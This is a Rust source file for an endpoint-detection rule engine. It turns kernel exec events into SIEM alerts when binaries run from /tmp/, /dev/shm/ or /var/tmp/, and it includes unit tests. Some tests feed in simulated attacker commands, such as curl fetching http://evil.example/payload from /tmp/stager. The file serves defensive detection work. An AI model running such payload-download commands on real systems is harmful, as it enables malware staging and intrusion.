use neuromesh_common::SecurityTelemetryEvent;
use serde::Serialize;
use std::borrow::Cow;

/// Severity emitted for blacklist / threat-signature matches.
pub const SEVERITY_CRITICAL_ALERT: &str = "CRITICAL_ALERT";

/// Exact binary paths silently dropped to reduce operational noise.
const WHITELIST_PATHS: &[&str] = &["/bin/ls", "/bin/cat", "/usr/bin/git", "/usr/bin/bash"];

/// Directory prefixes associated with malware staging and rootkit drop zones.
const BLACKLIST_PREFIXES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/"];

/// Outcome of applying detection rules to a single telemetry event.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleVerdict {
    /// Benign system activity — discard without emission.
    Suppressed,
    /// Actionable detection — serialize to JSON for downstream SIEM ingestion.
    /// Boxed so `RuleVerdict` stays niche-friendly under clippy `large_enum_variant`
    /// (SiemAlert grew with Issue #46 `argv`).
    Alert(Box<SiemAlert>),
}

/// Structured alert payload mapped to JSON for Elasticsearch/Datadog pipelines.
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct SiemAlert {
    pub timestamp: String,
    pub severity: String,
    pub rule_id: String,
    pub rule_name: String,
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub euid: u32,
    pub comm: String,
    pub binary_path: String,
    pub argv: String,
    pub argv_truncated: bool,
    pub argv_trunc_mask: u8,
    pub matched_pattern: String,
}

/// User-space detection brain: whitelist noise reduction + blacklist threat signatures.
#[derive(Debug, Clone)]
pub struct RuleEngine;

impl RuleEngine {
    pub fn new() -> Self {
        Self
    }

    /// Classify a kernel telemetry event against whitelist and blacklist policies.
    pub fn evaluate(&self, event: &SecurityTelemetryEvent) -> RuleVerdict {
        let path = extract_filename(event);

        if Self::is_whitelisted(&path) {
            return RuleVerdict::Suppressed;
        }

        if let Some(prefix) = Self::blacklist_match(&path) {
            return RuleVerdict::Alert(Box::new(SiemAlert {
                timestamp: chrono::Utc::now().to_rfc3339(),
                severity: SEVERITY_CRITICAL_ALERT.to_string(),
                rule_id: "NEUROMESH-EXEC-BLACKLIST-PATH".to_string(),
                rule_name: "Execution from ephemeral malware staging directory".to_string(),
                pid: event.pid,
                ppid: event.ppid,
                uid: event.uid,
                euid: event.euid,
                comm: extract_comm(event),
                binary_path: path.into_owned(),
                argv: format_argv_cmdline(&event.argv, event.argv_len),
                argv_truncated: event.argv_truncated,
                argv_trunc_mask: event.argv_trunc_mask,
                matched_pattern: prefix.to_string(),
            }));
        }

        RuleVerdict::Suppressed
    }

    /// Serialize an alert to a compact, strictly valid JSON line for SIEM forwarding.
    pub fn format_json(alert: &SiemAlert) -> Result<String, serde_json::Error> {
        serde_json::to_string(alert)
    }

    fn is_whitelisted(path: &str) -> bool {
        WHITELIST_PATHS.contains(&path)
    }

    fn blacklist_match(path: &str) -> Option<&'static str> {
        BLACKLIST_PREFIXES
            .iter()
            .copied()
            .find(|prefix| path.starts_with(prefix))
    }
}

impl Default for RuleEngine {
    fn default() -> Self {
        Self::new()
    }
}

fn extract_filename(event: &SecurityTelemetryEvent) -> Cow<'_, str> {
    match std::ffi::CStr::from_bytes_until_nul(&event.filename) {
        Ok(cstr) => cstr.to_string_lossy(),
        Err(_) => Cow::Borrowed("[Invalid Path]"),
    }
}

fn extract_comm(event: &SecurityTelemetryEvent) -> String {
    match std::ffi::CStr::from_bytes_until_nul(&event.comm) {
        Ok(cstr) => cstr.to_string_lossy().into_owned(),
        Err(_) => "[Unknown]".to_string(),
    }
}

fn format_argv_cmdline(argv: &[u8], argv_len: u16) -> String {
    use neuromesh_common::{MAX_ARGS_CAPTURE, MAX_ARGV_LEN, MAX_ARG_STR_LEN};

    let slots = (argv_len as usize).min(MAX_ARGS_CAPTURE);
    let buf = if argv.len() >= MAX_ARGV_LEN {
        &argv[..MAX_ARGV_LEN]
    } else {
        argv
    };
    let mut out = String::new();
    for i in 0..slots {
        let start = i * MAX_ARG_STR_LEN;
        let end = (start + MAX_ARG_STR_LEN).min(buf.len());
        if start >= end {
            break;
        }
        let slot = &buf[start..end];
        let nul = slot.iter().position(|&b| b == 0).unwrap_or(slot.len());
        if nul == 0 {
            continue;
        }
        if !out.is_empty() {
            out.push(' ');
        }
        out.push_str(&String::from_utf8_lossy(&slot[..nul]));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use neuromesh_common::{MAX_ARGV_LEN, MAX_COMM_LEN, MAX_FILENAME_LEN};

    fn event_with_path(path: &str) -> SecurityTelemetryEvent {
        let mut filename = [0u8; MAX_FILENAME_LEN];
        let bytes = path.as_bytes();
        filename[..bytes.len()].copy_from_slice(bytes);
        SecurityTelemetryEvent {
            pid: 4242,
            ppid: 1,
            uid: 1000,
            euid: 1000,
            comm: [0u8; MAX_COMM_LEN],
            filename,
            argv_len: 0,
            argv_truncated: false,
            argv_trunc_mask: 0,
            argv: [0; MAX_ARGV_LEN],
        }
    }

    fn event_with_argv(path: &str, argv_parts: &[&str]) -> SecurityTelemetryEvent {
        use neuromesh_common::{MAX_ARGS_CAPTURE, MAX_ARG_STR_LEN};

        let mut event = event_with_path(path);
        let mut slots = 0usize;
        let mut trunc_mask = 0u8;
        for (i, part) in argv_parts.iter().take(MAX_ARGS_CAPTURE).enumerate() {
            let start = i * MAX_ARG_STR_LEN;
            let bytes = part.as_bytes();
            let n = bytes.len().min(MAX_ARG_STR_LEN.saturating_sub(1));
            if bytes.len() >= MAX_ARG_STR_LEN.saturating_sub(1) {
                trunc_mask |= 1 << i;
            }
            event.argv[start..start + n].copy_from_slice(&bytes[..n]);
            slots += 1;
        }
        event.argv_len = slots as u16;
        event.argv_truncated = trunc_mask != 0;
        event.argv_trunc_mask = trunc_mask;
        event
    }

    #[test]
    fn whitelist_suppresses_benign_binaries() {
        let engine = RuleEngine::new();
        for path in ["/bin/ls", "/bin/cat", "/usr/bin/git", "/usr/bin/bash"] {
            let verdict = engine.evaluate(&event_with_path(path));
            assert_eq!(verdict, RuleVerdict::Suppressed);
        }
    }

    #[test]
    fn blacklist_flags_ephemeral_directories() {
        let engine = RuleEngine::new();
        let verdict = engine.evaluate(&event_with_path("/tmp/evil.bin"));
        assert!(matches!(verdict, RuleVerdict::Alert(_)));
        if let RuleVerdict::Alert(alert) = verdict {
            assert_eq!(alert.severity, SEVERITY_CRITICAL_ALERT);
            assert_eq!(alert.matched_pattern, "/tmp/");
        }
    }

    #[test]
    fn critical_alert_json_includes_argv_distinguishing_curl_urls() {
        let engine = RuleEngine::new();
        let event_a = event_with_argv("/tmp/stager", &["curl", "http://evil.example/payload"]);
        let event_b = event_with_argv("/tmp/stager", &["curl", "http://good.example/payload"]);

        let verdict_a = engine.evaluate(&event_a);
        let verdict_b = engine.evaluate(&event_b);

        let (RuleVerdict::Alert(alert_a), RuleVerdict::Alert(alert_b)) = (verdict_a, verdict_b)
        else {
            panic!("expected CRITICAL_ALERT for both staging-path curl events");
        };

        assert_ne!(alert_a.argv, alert_b.argv);
        assert!(alert_a.argv.contains("http://evil.example/payload"));
        assert!(alert_b.argv.contains("http://good.example/payload"));

        let json_a = RuleEngine::format_json(&alert_a).expect("json");
        assert!(json_a.contains("http://evil.example/payload"));
        assert!(json_a.contains("\"argv\""));
    }

    #[test]
    fn critical_alert_json_flags_argv_truncation_for_long_slot() {
        use neuromesh_common::MAX_ARG_STR_LEN;

        let engine = RuleEngine::new();
        let long_url = "http://evil.example/very/long/path/that-exceeds";
        let mut event = event_with_argv("/tmp/x", &["curl", long_url]);
        event.argv_truncated = true;
        event.argv_trunc_mask = 1 << 1;

        let verdict = engine.evaluate(&event);
        let RuleVerdict::Alert(alert) = verdict else {
            panic!("expected CRITICAL_ALERT for staging path with truncated argv");
        };

        let truncated = &long_url[..MAX_ARG_STR_LEN.saturating_sub(1)];
        assert!(alert.argv_truncated);
        assert_eq!(alert.argv_trunc_mask, 1 << 1);
        assert!(alert.argv.contains(truncated));

        let json = RuleEngine::format_json(&alert).expect("json");
        assert!(json.contains("\"argv_truncated\":true"));
        assert!(json.contains(truncated));
    }
}
